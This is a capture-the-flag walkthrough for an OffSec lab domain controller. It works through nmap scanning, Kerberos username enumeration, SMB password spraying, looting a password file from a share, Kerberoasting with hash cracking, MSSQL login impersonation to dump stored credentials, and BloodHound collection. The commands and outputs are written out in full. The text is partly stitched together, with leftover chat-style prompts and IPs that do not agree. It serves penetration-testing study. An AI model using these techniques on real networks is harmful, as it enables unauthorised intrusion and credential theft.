# Hokkaido-Aerospace – Proving Grounds (OffSec) Cheatsheet

**Target**     : hokkaido (Domain Controller)  
**IP**         : 192.168.128.40  
**Domain**     : hokkaido-aerospace.com  
**Difficulty** : Medium (community rated **Hard/Very Hard**) – heavy enumeration  
**Lab Date**   : ~ March 2026  
**OS**         : Windows Server 2022 (build ~20348 from nmap)  
**Goal**       : Domain Admin / SYSTEM flags

## 0. Setup / Hosts file

```bash
# Add to /etc/hosts (very important for Kerberos / DNS resolution)
sudo nano /etc/hosts
```
<img width="803" height="232" alt="image" src="https://github.com/user-attachments/assets/cbc1f15e-05b7-423a-ab60-d183bf3f6910" />

```
192.168.128.40 hokkaido
```

## 1. Initial Recon – Nmap

**Full port + default scripts + version detection**

```bash
# Aggressive full port scan (recommended for AD labs)
sudo nmap -sC -sV hokkaido -sT -vvv -p- -Pn -T5 --min-rate=5000
```
```bash
sudo nmap -sC -sV hokkaido -sT -vvvv -p- -Pn -T5 --min-rate=5000

PORT      STATE    SERVICE        REASON      VERSION
53/tcp    open     domain         syn-ack     Simple DNS Plus
80/tcp    open     http           syn-ack     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec   syn-ack     Microsoft Windows Kerberos (server time: 2025-05-16 14:02:02Z)
135/tcp   open     msrpc          syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn    syn-ack     Microsoft Windows netbios-ssn
389/tcp   open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
445/tcp   open     microsoft-ds?  syn-ack
464/tcp   open     kpasswd5?      syn-ack
593/tcp   open     ncacn_http     syn-ack     Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap       syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
1433/tcp  open     ms-sql-s       syn-ack     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   192.168.128.40:1433:
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
| ms-sql-info:
|   192.168.128.40:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
3269/tcp  open     ssl/ldap       syn-ack     Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Issuer: commonName=hokkaido-aerospace-DC-CA/domainComponent=hokkaido-aerospace
3389/tcp  open     ms-wbt-server  syn-ack     Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Issuer: commonName=dc.hokkaido-aerospace.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-15T13:51:51
| Not valid after:  2025-11-14T13:51:51
| MD5:   37b4:2769:019c:9068:c300:46e5:9ca9:3e0e
| SHA-1: 25cf:2462:c0b0:737c:55cf:04b2:695c:9b14:96ee:d53d
| rdp-ntlm-info:
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-05-16T14:02:51+00:00
|_ssl-date: 2025-05-16T14:02:58+00:00; 0s from scanner time.
5985/tcp  open     http           syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open     http           syn-ack     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 403 - Forbidden: Access is denied.
8531/tcp  open     unknown        syn-ack
9389/tcp  open     mc-nmf         syn-ack     .NET Message Framing
47001/tcp open     http           syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49684/tcp open     ncacn_http     syn-ack     Microsoft Windows RPC over HTTP 1.0
58538/tcp open     ms-sql-s       syn-ack     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   192.168.128.40:58538:
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ms-sql-info:
|   192.168.128.40:58538:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
```

**Key open ports & services**

- 53/tcp    → DNS
- 80/tcp    → IIS 10.0 (default page)
- 88/tcp    → Kerberos
- 135,593,49684 → RPC
- 139/445   → SMB (no null session likely)
- 389/636,3268/3269 → LDAP / LDAPS / Global Catalog
- 1433/tcp  → MSSQL 2019 (default instance)
- 3389/tcp  → RDP
- 5985/tcp  → WinRM
- 8530/tcp  → IIS (403 Forbidden – interesting)
- 58538/tcp → MSSQL named instance

**Important observations**

- Domain: `hokkaido-aerospace.com`
- NetBIOS / NTLM domain: `HAERO`
- Computer name: `DC`
- SQL Server 2019 RTM (no patches visible)
- Multiple SQL instances (default + named on 58538)
- TRACE method enabled on IIS (usually not useful here)

## 2. Valid Username Enumeration – Kerbrute

**Command used**

```bash
kerbrute userenum -d hokkaido-aerospace.com --dc hokkaido /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
<img width="1165" height="412" alt="image" src="https://github.com/user-attachments/assets/8aa67fae-b625-4dce-9824-4df9f49ba8bb" />

**Valid users found**

```
info
administrator
discovery
maintenance
```

→ Classic OffSec low-hanging fruit usernames

## 3. Password Spraying

**Users list** (`users.txt`)

```
info
administrator
discovery
maintenance
```

**Passwords list** (`passwords.txt`) – seasonal + username variants

```
Winter2023
Summer2023
Spring2023
Fall2023
info
administrator
discovery
maintenance
ofni
rotartsinimda
yrevocsid
ecnanetniam
```

** spraying command (NetExec / nxc)**

```bash
# Check SMB + shares + valid creds
nxc smb hokkaido -u users.txt -p passwords.txt --shares
nxc smb hokkaido -u users.txt -p passwords.txt --shares | tee nxc-spray.txt  -> if you wanna save output use this one

# Alternative: focus only on valid logins (faster)
nxc smb hokkaido -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```
<img width="1718" height="666" alt="image" src="https://github.com/user-attachments/assets/39f59439-1941-4a4c-ab97-eefc167e7574" />

**Hit!**  
After trying seasonal passwords + username-as-password variants, we got a match:

- **Username**: info  
- **Password**: info  
- **Domain**: hokkaido-aerospace.com  
- **NetBIOS domain**: HAERO  
- **Permissions**: READ on many shares (no ADMIN$ or C$)

**Key output highlights**:

- Valid login: `hokkaido-aerospace.com\info:info`  
- Shares accessible (READ unless noted):

  | Share              | Permissions    | Remark / Purpose                              |
  |--------------------|----------------|-----------------------------------------------|
  | ADMIN$             | —              | Remote Admin (no access)                      |
  | C$                 | —              | Default share (no access)                     |
  | homes              | READ, WRITE    | User home directories (big clue!)             |
  | IPC$               | READ           | Remote IPC                                    |
  | NETLOGON           | READ           | Logon server share (scripts, policies)        |
  | SYSVOL             | READ           | Group Policy objects                          |
  | UpdateServicesPackages | READ     | WSUS-related                                  |
  | WsusContent        | READ           | WSUS published content                        |
  | WSUSTemp           | READ           | WSUS temp publishing                          |

→ **homes** share is writable and contains user-named folders → likely contains clues or weak files.

### 5. Exploring the \homes Share

**Mount / browse with smbclient** (interactive):

```bash
# Connect (use single quotes around domain\user if needed)
smbclient -U 'hokkaido-aerospace.com\info' //hokkaido/homes

<img width="793" height="550" alt="image" src="https://github.com/user-attachments/assets/e929f840-78d6-4607-b7a8-35b32ec2e680" />

Password: `info`
**Note**: No `DHS` folder exists (earlier misread / not present in this instance).  
User homes are placeholders — no files or clues here.

**Exit**:

```bash
exit
```

## 6. Pivotal Discovery: NETLOGON Share – Password Reset Clue

**Connect and recursively download contents** (non-interactive – recommended):

```bash
smbclient //hokkaido/NETLOGON -U 'hokkaido-aerospace.com\info%info' -c 'recurse; prompt; mget *'
```

**Output**:

```
getting file \temp\password_reset.txt of size 27 as temp/password_reset.txt (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
```

**Read the file**:

```bash
cat temp/password_reset.txt
```

**Content**:

```
Initial Password: Start123!
```
<img width="1210" height="162" alt="image" src="https://github.com/user-attachments/assets/42ce426c-feb7-43ba-9f42-7586a44db9d4" />


→ This is the **key breakthrough** — a weak initial password set for new/service accounts.

### Next Immediate Actions (Password Spraying Round 2)

1. **Quick spray** against known users:

```bash
nxc smb hokkaido -u users.txt -p 'Start123!' --continue-on-success
```
<img width="1634" height="137" alt="image" src="https://github.com/user-attachments/assets/896c3652-8a76-43b5-bc97-d4ab0823a8c0" />

**Output summary**:

- All attempts failed (`STATUS_LOGON_FAILURE`)
- No valid credentials found with `Start123!`

**Detailed results** (from screenshot):

| Username                  | Password     | Status                  |
|---------------------------|--------------|-------------------------|
| info                      | Start123!    | STATUS_LOGON_FAILURE    |
| administrator             | Start123!    | STATUS_LOGON_FAILURE    |
| discovery                 | Start123!    | STATUS_LOGON_FAILURE    |
| maintenance               | Start123!    | STATUS_LOGON_FAILURE    |

**Observations**:
- `Start123!` did **not** work on any of the initially enumerated users.
- This password is likely intended for a **different / newly created / service account** not yet in our list.
- Common in Hokkaido: the initial password works on a **non-standard user** discovered via LDAP, share files, or further enumeration.

## 7. Password Spraying Round 2 – Testing Start123! (Success on discovery)

**Command executed**:

```bash
nxc smb hokkaido -u users.txt -p 'Start123!' --continue-on-success
```
<img width="1642" height="134" alt="image" src="https://github.com/user-attachments/assets/6396feeb-3027-4bc1-ac7f-9fd1cc61cd48" />

**Important note**: First run may show NetExec initialization messages (creating folders, databases, etc.) — this is normal on first use.

**Key result** (from screenshot):

- `info:Start123!` → **STATUS_LOGON_FAILURE** (expected, already have better password for info)
- `administrator:Start123!` → **STATUS_LOGON_FAILURE**
- `discovery:Start123!` → **[+] Valid credential!** (green [+] line)
- `maintenance:Start123!` → **STATUS_LOGON_FAILURE**

**Breakthrough credential found**:

- **Username**: discovery  
- **Password**: Start123!  
- **Domain**: hokkaido-aerospace.com  
- **NetBIOS**: HAERO  
- **Status**: Valid login (SMB signing: True)

Since neither found accounts were actually able to login anywhere it was time for Kerberoasting.

## 8. Kerberoasting with discovery Creds

**Goal**: Use valid `discovery:Start123!` creds to request Kerberos service tickets (TGS) for accounts with SPNs (Kerberoastable), extract hashes, and attempt offline cracking.

**Command to run** (non-interactive request + save hashes):

```bash
impacket-GetUserSPNs -request -dc-ip hokkaido hokkaido-aerospace.com/discovery:Start123! -outputfile hashes.txt
```
<img width="1620" height="227" alt="image" src="https://github.com/user-attachments/assets/95b09afb-ebb9-48e3-9071-60bb3f80002d" />

**Output highlights** 

- 2 Kerberoastable SPNs identified:

  | ServicePrincipalName                          | Name        | MemberOf                                      | PasswordLastSet            | LastLogon | Delegation |
  |-----------------------------------------------|-------------|-----------------------------------------------|----------------------------|-----------|------------|
  | discover/dc.hokkaido-aerospace.com            | discovery   | CN=services,CN=Users,DC=hokkaido-aerospace,DC=com | 2023-12-06 15:42:22       | <never>   |            |
  | maintenance/dc.hokkaido-aerospace.com         | maintenance | CN=services,CN=Users,DC=hokkaido-aerospace,DC=com | 2023-11-25 13:39:04       | <never>   |            |

- `discover/dc` → tied to `discovery` user (password already known → skip)
- `maintenance/dc` → roastable → TGS hash successfully requested and saved to `hashes.txt`
- Note: "CCache file is not found. Skipping..." → normal (no cached ticket needed here)

**Screenshot** (full Impacket output + SPN table):

<img width="1668" height="517" alt="image" src="https://github.com/user-attachments/assets/8485d7cd-3f18-4337-9eef-901e0694cef1" />


**Cracking attempt with John the Ripper**:

```bash
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
<img width="957" height="149" alt="image" src="https://github.com/user-attachments/assets/e841e943-416c-462e-a047-17bea6990ab7" />

**Output summary** (from screenshot):

- Loaded hashes: UTF-8 encoding, 8 different salts (Kerberos 5 TGS etype 23 – MD4 HMAC-MD5 RC4)
- Session ran for ~5 seconds (very fast → small hash set)
- Result: **0g 0:00:00:05 DONE** → **No passwords cracked**
- Status: Session completed (no hits)

**Screenshot** (John cracking attempt – "Too bad"):

<img width="957" height="149" alt="image" src="https://github.com/user-attachments/assets/b4ac2d99-d992-40d6-b66b-6d91dac4b903" />


**Conclusion** (aligned with TJNull/Medium writeup):
- `maintenance` hash did **not** crack (common in Hokkaido – password is strong/random or etype not weak enough for rockyou)
- Do **not** spend more time on heavy cracking (GPU/ bigger lists) — pivot to next vector.

### Next Pivot: MSSQL Enumeration & Exploitation (Writeup Core Path)

With `discovery:Start123!` valid and Kerberoasting exhausted:

1. **Interactive MSSQL client** (recommended – full control):

   ```bash
   impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'Start123!'@hokkaido -dc-ip hokkaido -windows-auth
   ```
   <img width="1039" height="241" alt="image" src="https://github.com/user-attachments/assets/b90a2acc-03ae-43bf-973b-d175a59c5b04" />



```markdown
## 9. MSSQL Pivot with discovery Creds – Impersonation & Database Dump

**Connected successfully** using Impacket:

```bash
impacket-mssqlclient 'hokkaido-aerospace.com/discovery:Start123!'@hokkaido -windows-auth -dc-ip hokkaido
```

**Initial context**: Logged in as `discovery` (guest in `master` DB) on SQL Server 2019 RTM.

### Step 1: Tried to enable OS command execution (for shell):

```sql
enable_xp_cmdshell
```

**Errors**:

```
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```

→ No sysadmin rights → cannot enable advanced options.

### Step 2: Enumerate Databases

```sql
SELECT name FROM master..sysdatabases;
```
<img width="744" height="169" alt="image" src="https://github.com/user-attachments/assets/43a5ae8b-62c9-4818-9485-8e0ab4d78475" />

**Output**:

- master
- tempdb
- model
- msdb
- **hrappdb** (custom application database – juicy!)

Tried direct access:

```sql
USE hrappdb;
```
<img width="1394" height="57" alt="image" src="https://github.com/user-attachments/assets/52d9b287-4057-47e7-b6bf-ec0b18f46c28" />


**Error**:

```
"HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```

→ Need to impersonate a user with access.

### Step 3: Check for Impersonation Permissions

**Query** (key command – reveals who we can impersonate):

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```
<img width="1529" height="115" alt="image" src="https://github.com/user-attachments/assets/19a205bb-50c4-4f12-9278-26a48899e647" />

**Output**:

```
hrappdb-reader
```

→ We can `EXECUTE AS` the `hrappdb-reader` login!

### Step 4: Impersonate hrappdb-reader & Access hrappdb

```sql
EXECUTE AS LOGIN = 'hrappdb-reader';
```
<img width="707" height="40" alt="image" src="https://github.com/user-attachments/assets/09b30cbb-69b5-47a8-b48d-b402bab2a448" />


**Success**: Prompt changes to `SQL (hrappdb-reader guest@master)>`

Now switch DB:

```sql
USE hrappdb;
```
<img width="681" height="79" alt="image" src="https://github.com/user-attachments/assets/c6d8ab70-8fb5-442f-84db-ea01bc78d48c" />


**Success**:

```
Changed database context to 'hrappdb'.
```

### Step 5: Enumerate Tables in hrappdb

```sql
SELECT name FROM sys.tables;
```

(or alternative: `SELECT * FROM INFORMATION_SCHEMA.TABLES;`)
<img width="734" height="89" alt="image" src="https://github.com/user-attachments/assets/f1b7c133-c9d7-425c-8e4b-3dcf7956b795" />

**Output**:

- Only one table: **sysauth**

### Step 6: Dump the sysauth Table (Creds Found!)

```sql
SELECT * FROM sysauth;
```
<img width="642" height="87" alt="image" src="https://github.com/user-attachments/assets/e7233519-1f4f-4f60-9caa-d94f5458f805" />

→ New service account creds discovered:  
**Username**: hrapp-service  
**Password**: Untimed$Runny  
(Domain: hokkaido-aerospace.com)

**Note**: Impacket displays strings as `b'hrapp-service'` (Python bytes literal) — ignore the `b'` prefix; actual value is plain text.

## 11. BloodHound Collection & Initial Analysis with hrapp-service Creds

**Goal**: Use the new service account `hrapp-service:Untimed$Runny` to collect AD data for BloodHound and analyze attack paths to Domain Admin.

### Step 1: Password Spraying on hrapp-service (Failed)

Tried spraying common passwords (from `passwords.txt`) against WinRM:

```bash
nxc winrm hokkaido -u 'hrapp-service' -p passwords.txt
```
```bash
nxc smb 192.168.51.40 -u usernames.txt -p 'Untimed$Runny' --continue-on-success | grep '[+]' 
```
<img width="893" height="41" alt="image" src="https://github.com/user-attachments/assets/96b07d7c-89dd-4ea5-bc03-493669700d0a" />

### Why this one?
- It sprays the **new password `Untimed$Runny`** (from `hrapp-service`) against your larger `usernames.txt` list via **SMB**.
- `--continue-on-success` ensures it doesn't stop after the first hit.
- `| grep '[+]'` filters only the **valid logins** (green `[+]` lines in nxc output).
- IP `192.168.51.40` is your current lab IP (from the command in your message).

**What we expected / what usually happens in Hokkaido**:
- Likely **only one hit**: `hrapp-service:Untimed$Runny` (the password was specifically set for this service account in the DB).
- No other users reused `Untimed$Runny` (no `[+]` for discovery, maintenance, etc.).
- This is why password spraying didn't yield more accounts → the creds are **service-specific**, not domain-wide weak.


### Now time to check BloodHound for new leads

**Why we pivoted to BloodHound instead**:

- Spraying failed to give new logins (no new shells, no new WinRM/RDP access).
- `hrapp-service` is a **low-to-mid priv service account** with likely **interesting AD rights** (GenericWrite, ForceChangePassword, etc.).
- The fastest way forward in Hokkaido (per TJNull/Medium writeups) is **BloodHound enumeration** to find attack paths:
  - Shortest paths to Domain Admins
  - Users/groups/computers that `hrapp-service` can control (e.g. reset password on a user → Kerberoast → crack → RDP → priv esc)

**Docker BloodHound-legecy Setup**: [Install BloodHound-Legecy](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart):

```bash
bloodhound-python -d hokkaido-aerospace.com -u hrapp-service -p 'Untimed$Runny' -ns 192.168.51.40 -dc dc.hokkaido-aerospace.com -c All --zip
```
<img width="1378" height="389" alt="image" src="https://github.com/user-attachments/assets/05c6548d-71c4-4e43-8ca0-da444316c795" />

### What This Means
- **Success**: BloodHound collected **all** relevant AD objects using the `hrapp-service` credentials.
- **Data size**: Small but complete lab (34 users, 62 groups, 2 computers = typical Hokkaido setup with DC + maybe 1 other machine).
- **ZIP file**: `20260303062906_bloodhound.zip` (timestamp-based) — this is the file you need to upload to your BloodHound CE web interface.
- No DNS timeout this time → the collection ran smoothly (likely because VPN stabilized or the query was fast enough).

### Next Steps (Immediate Actions)
1. **Upload the ZIP to BloodHound CE**
   - Open your Docker instance: http://localhost:8080 (or whatever port you configured)
   - Login (default: admin / admin)
   - Go to **Upload Data** → drag & drop or select the ZIP file (`20260303062906_bloodhound.zip`)
   - Wait for import to finish (usually quick for small labs like this)
   - Refresh the database if prompted

2. **Analyze in the UI** (this is where the magic happens)
   - Search for the starting node: `HRAPP-SERVICE@HOKKAIDO-AEROSPACE.COM`
   - Right-click → **Shortest Paths to Domain Admins** (or "Show paths from this node")
   - Look specifically for:
     - **ForceChangePassword** rights (allows password reset on a target user)
     - **GenericWrite** / **GenericAll** on users, groups, or computers
     - Any path involving **Hazel.Green**, **Molly.Smith**, or similar users (common in Hokkaido)
   - Also run built-in queries:
     - Shortest Paths to Domain Admins
     - Principals with DCSync Rights
     - Paths to High Value Targets

### It seems we can use a targeted kerberoast against Hazel.Green
`Installatiom`
```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```







```bash
docker-compose up -d
```

- Access: http://localhost:8080
- Login (default): admin / admin (or your custom creds)
- Upload the ZIP file from bloodhound-python

**Initial graph** (from screenshot):
- Basic MemberOf relationships visible (DOMAIN USERS → AUTHENTICATED USERS → etc.)
- Now ready for real analysis

**Next Actions in BloodHound** (do these now):

1. **Import ZIP** → Refresh the database.
2. **Run built-in queries**:
   - Shortest Paths to Domain Admins (most important)
   - Principals with DCSync Rights
   - Paths to High Value Targets
   - Find nodes with `GenericAll`, `GenericWrite`, `ForceChangePassword` from `hrapp-service`
3. **Typical Hokkaido path** (based on writeups):
   - `hrapp-service` has GenericWrite / ResetPassword on a user (e.g. Hazel.Green or similar low-priv user)
   - Reset that user's password → add SPN → Kerberoast → crack hash
   - Use cracked creds → RDP or WinRM → SeBackupPrivilege → dump SAM → Administrator NT hash → pwn DC

**Screenshot** (add after analysis):
- Shortest path to DA
- Any interesting ACLs (right-click node → "Show paths to/from this node")

**If spray had hits** (unlikely but possible):
- New valid accounts → re-run BloodHound with those creds for more data
- But in your case: **spray was negative → BloodHound is the way**

Paste:
- The output of the spray command (any `[+]` lines?)
- BloodHound findings (shortest path screenshot/description, any notable rights like ForceChangePassword on a user)

We'll add **Section 13: BloodHound Attack Path Execution** next (password reset, Kerberoast, etc.).


